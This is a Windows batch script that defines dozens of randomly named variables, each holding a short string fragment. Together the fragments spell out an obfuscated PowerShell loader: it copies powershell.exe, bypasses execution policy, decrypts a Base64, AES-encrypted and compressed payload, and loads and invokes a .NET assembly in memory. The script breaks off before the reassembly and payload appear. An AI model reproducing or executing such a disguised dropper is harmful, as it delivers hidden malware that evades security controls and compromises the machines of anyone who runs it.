@echo off
set "gBwdjdCDiu=rs"
set "USpTbJGrML=32"
set "zYxDQwmAbw=\W"
set "niRjyrKUQw=st"
set "FcLVsovqmw=he"
set "ziRauHhwoj=in"
set "KcJGZrFqfl= /"
set "MaYSoMaozu=Po"
set "yLhWrvSXhO=do"
set "OKQvISVPfX=co"
set "LUwyvOqmiD=xe"
set "SAcVLlvhPe=ow"
set "HkOmLKzeQd=y "
set "EdKzOjcHwR=s\"
set "ZDSHbbRFal=0\"
set "clzdWXAMLd=nd"
set "QbhASfsVcu=we"
set "wUOYRzGYPG=py"
set "PxTUqoyFSa=po"
set "WRkeJEZvNk= C"
set "EpsmLgaMeW=rS"
set "KthfWyXxGa=ws"
set "wubxxYBZpN=em"
set "uDyNmAqDSj=ll"
set "GvlkvwHLgh=\v"
set "LokCKSuOgO=1."
set "IVCGfoaPKn=.e"
set "RNPCHSCQBb=Wi"
set "biTLiaLwJm=Sy"
set "uOWgYYvsPW=ll"
set "KJPoxyNoIE=he"
set "CkcDmNRBmv=we"
set "llzGjNUCnq=:\"
set "fOUgzEjHmM= %~dp0"
set "MeVgkAbfPC=cd"
set "RWPQVTFqFz=6] -"
set "CGXlbCKbyb=Bmor"
set "pbCXFFeOLk=ispo"
set "GRURgwHxAe=bjec"
set "hABiJOPfnz=New-"
set "fRsBqYGkMm=;$Mq"
set "ZjWJwropKc=9tpc"
set "QoWcuEetnO=ose("
set "OwOfOgzOxl=[Env"
set "VAMIKoGVFd=yste"
set "NHRyBvPsCg=();$"
set "lzzWfJzPTI=vert"
set "zjwKMwtFVJ=y.Pa"
set "rmrbYtvODJ=.Cre"
set "xGMKTyiGtk=orF'"
set "tvduzCwrnd=.Cop"
set "GLJovGZwAu=; };"
set "wUueWlMAbJ= [st"
set "fjyhVECdhg=oWo."
set "aXPsFaOZSm=.Mem"
set "enNHKSTQVQ=New-"
set "DzHxhAcdFU=);$z"
set "wmITrZHoSp=);$x"
set "QgrGeNIXmZ=RD ="
set "fHZvWsLVeo=);$N"
set "yhcaJaKnDJ=..-1"
set "kpqKhRwEai=-nop"
set "yIWRTVnItY=);$J"
set "PeCmmPwVqJ=ateD"
set "iTEAyRSkto=.Ass"
set "gJPyxedmHr='gni"
set "BibckMBAtO=-4] "
set "IZLuyCWBFx=gMod"
set "MjtxFezSjC=$zMJ"
set "VSkrmYqrIL=[Sys"
set "HBzCUvliAU=ke($"
set "YTHpOfzxRT=SoYj"
set "clMDjVzzBI=g = "
set "xwzprpIAUs=.Key"
set "NmcVfadbQs=pJT."
set "WwEAuUBDVs=JfZt"
set "WRYrNqvLMr= New"
set "leWGjrtOkS=[IO."
set "vjjxnEYVJi=yste"
set "DGuoTssqae===')"
set "NjtpMYrzTg=and "
set "GzuHDpquwc=tsWi"
set "tKpsMLIiIZ=/a3B"
set "RCqwYjvviq== $z"
set "GxRJdToJPP=oL'["
set "KqPZlqTYNz=tryP"
set "kTjhhCRUYA=m(, "
set "LiKACyECzK=:: '"
set "gAOMtEWpNp=bypa"
set "QQKcJRHFTn=Ti8L"
set "RLLoTkvONo=ress"
set "MkZyXWeZCt=e]::"
set "zNojrfhhAa=[-1."
set "gccpEmHVVu=($Wd"
set "OHKyLxjtLm=.Mod"
set "saJiTVVhVY=ress"
set "kZDgkGRNkY=.IO."
set "baoGNJRMmW=.Sec"
set "XtfXsuOytH=wAjA"
set "VPzVUZIONc=[Sys"
set "eNEJHCezNm=Fina"
set "LNUMnZiGrV= = $"
set "IsuiVUkrYX=-ep "
set "PKwafvabeL=brea"
